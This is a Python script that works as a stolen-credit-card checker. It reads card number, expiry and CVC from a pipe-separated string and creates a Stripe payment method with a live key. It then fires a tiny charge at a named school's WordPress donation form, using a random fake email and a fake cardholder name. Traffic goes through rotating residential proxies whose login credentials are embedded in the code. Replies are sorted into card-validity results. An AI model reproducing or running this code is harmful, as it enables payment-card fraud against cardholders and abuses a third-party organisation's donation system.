import requests, re
import random
import string
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ==========================================
# 👇 PROXY SETTINGS (GATE 2)
# ==========================================
PROXY_HOST = 'geo.g-w.info'
PROXY_PORT = '10080'
PROXY_USER = 'user-4lBIk7F33kmukbis-type-residential-session-v2xr13q1-country-US-city-San_Francisco-rotation-15'
PROXY_PASS = 'dE7GREU8apEHIf8C'

proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {'http': proxy_url, 'https': proxy_url}

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy: yy = yy.split("20")[1]
        letters = string.ascii_lowercase + string.digits
        random_name = ''.join(random.choice(letters) for i in range(10))
        random_email = f"{random_name}@gmail.com"

        session = requests.Session()
        retry = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.proxies = proxies

        # Step 1: Create Payment Method
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F35d1c775d8%3B+stripe-js-v3%2F35d1c775d8%3B+card-element&key=pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=60)
        try: json_response = response.json()
        except: return "Proxy Error (Invalid JSON) ❌"

        if 'error' in json_response:
            code = json_response['error'].get('code')
            if code in ['incorrect_number', 'invalid_number']: return "Invalid Card Number ❌"
            elif code == 'invalid_expiry_month': return "Invalid Expiry Date ❌"
            elif code == 'invalid_cvc': return "Invalid CVC ❌"
            else: return f"Stripe Error: {code} ❌"

        if 'id' not in json_response: return "Proxy Error (PM Failed) ❌"
        pm = json_response['id']

        # Step 2: Charge Request
        headers = {
            'authority': 'texassouthernacademy.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://texassouthernacademy.com',
            'referer': 'https://texassouthernacademy.com/donation/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'donate',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.5',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-billing-name': '6',
            'wpfs-billing-address-country': 'US',
            'wpfs-billing-address-line-1': 'Street 2',
            'wpfs-billing-address-line-2': '',
            'wpfs-billing-address-city': 'New York',
            'wpfs-billing-address-state': '',
            'wpfs-billing-address-state-select': 'CA',
            'wpfs-billing-address-zip': '10080',
            'wpfs-card-holder-email': random_email,
            'wpfs-card-holder-name': 'Min Thant',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }
        response = requests.post('https://texassouthernacademy.com/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=60)
        
        try: result = response.json()['message']
        except:
            if "Cloudflare" in response.text or response.status_code == 403: result = "IP Blocked by Site ❌"
            else: result = "Decline⛔"
    except: result = "Connection Failed (Retry Limit) ⚠️"
        
    return result
